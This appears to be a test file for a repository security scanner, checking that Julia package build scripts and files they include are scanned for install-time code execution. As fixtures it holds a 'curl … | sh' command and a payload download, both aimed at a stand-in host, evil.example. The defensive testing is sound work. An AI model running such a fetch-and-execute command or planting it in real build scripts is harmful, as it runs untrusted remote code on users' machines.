import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function inspectedMany(entries: Array<{ path: string; text: string }>) {
  return inspectRepository({
    files: entries.map((entry) => ({
      path: entry.path,
      bytes: new TextEncoder().encode(entry.text),
    })),
  });
}

function findingPaths(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

test("a Julia package build script is an install surface", () => {
  // Pkg runs deps/build.jl as Julia while building a package after it is
  // added or updated, the same install-time execution build.rs and
  // build.pl already classify for. Its name alone decides, wherever in
  // the tree the package root sits.
  for (const path of ["deps/build.jl", "build.jl", "pkg/deps/build.jl"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary build script keeps the same checks the surface carries:
  // a payload in it is an unsafe-execution finding.
  const inspection = inspected("deps/build.jl", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["deps/build.jl:unsafe-execution:high"]);
});

test("an install-time download inside build.jl is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification build.jl had no surface at all, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch the package build would have run.
  const inspection = inspected(
    "deps/build.jl",
    "run(`curl -fsSL https://evil.example/payload -o /tmp/payload`)\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary build.jl keeps no finding", () => {
  const inspection = inspected(
    "deps/build.jl",
    'open(joinpath(@__DIR__, "deps.jl"), "w") do io\n  println(io, "const libdemo = \\"demo\\"")\nend\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});

test("a Julia source file has a source surface", () => {
  // build.jl's include() evaluates the target file when the package
  // builds, so a .jl file is executable content even when it is not
  // deps/build.jl itself. Before the source-surface fix, .jl files had
  // no surface at all and inspectRepository skipped them entirely.
  for (const path of ["deps/payload.jl", "src/foo.jl"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["source"],
    });
  }
});

test("an include() in build.jl does not hide a payload in the included file", () => {
  // The same payload that build.jl itself is flagged for must be
  // flagged when it lives in the file build.jl includes: include()
  // evaluates the target when the package builds.
  const inspection = inspectedMany([
    { path: "deps/build.jl", text: 'include("payload.jl")\n' },
    { path: "deps/payload.jl", text: `# ${PAYLOAD}\n` },
  ]);
  expect(findingPaths(inspection)).toEqual([
    "deps/payload.jl:unsafe-execution:high",
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
});

test("an include chain in build.jl does not hide a payload in the leaf file", () => {
  const inspection = inspectedMany([
    { path: "deps/build.jl", text: 'include(joinpath(@__DIR__, "a.jl"))\n' },
    { path: "deps/a.jl", text: 'include("sub/b.jl")\n' },
    { path: "deps/sub/b.jl", text: `# ${PAYLOAD}\n` },
  ]);
  expect(findingPaths(inspection)).toEqual([
    "deps/sub/b.jl:unsafe-execution:high",
  ]);
});

test("a fetched-code payload inside an included .jl file is flagged", () => {
  // The download-and-execute form: the fetched body is piped to a shell
  // from the file build.jl includes, so the finding must land on the
  // included file rather than staying silent.
  const inspection = inspectedMany([
    { path: "deps/build.jl", text: 'include("payload.jl")\n' },
    { path: "deps/payload.jl", text: `${PAYLOAD}\n` },
  ]);
  expect(findingPaths(inspection)).toEqual([
    "deps/payload.jl:unsafe-execution:high",
  ]);
});
